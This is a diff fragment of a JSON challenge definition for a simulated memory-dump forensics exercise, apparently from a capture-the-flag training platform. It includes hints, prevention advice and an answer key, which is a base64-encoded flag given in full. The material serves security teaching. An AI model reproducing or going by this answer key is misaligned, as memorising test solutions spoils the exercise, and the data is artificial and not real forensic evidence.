+      "vulnerability": "Memory dumps can contain sensitive data in plaintext or encoded formats (base64, hex). Process memory, network data, and strings can reveal flags that were processed during execution.",
+      "howToExploit": "Examine different sections: Processes (look for unusual process names and data fields), Strings (search for 'FLAG{' or encoded data), Network (check connections and data transfers). The flag is in base64 format in network section: decode `RkxBR3tmb3JlbnNpY3NfaGFyZF9tZW1vcnlfZHVtcF9jZGV9` to get the flag. Or find hex-encoded flag in process data.",
+      "realWorldImpact": "Memory forensics is crucial for incident response. Can reveal malware behavior, encryption keys, passwords in memory, sensitive data processing. Advanced security investigation technique.",
+      "prevention": "Secure memory handling. Clear sensitive data from memory. Use encrypted memory where possible. Implement proper memory management. Secure memory dumps. Monitor memory access.",
+      "containerInfo": "Memory dump analysis is simulated. Real memory forensics requires specialized tools like Volatility."
+    },
+    "hints": [
+      "Check all sections: processes, strings, network",
+      "Look for base64 or hex encoded data",
+      "Decode the encoded strings to find the flag"
+    ],
+    "payloads": [
+      "Decode base64 strings",
+      "Convert hex to ASCII",
+      "Search for 'FLAG' pattern in all sections"
+    ]
+  }
+}
+
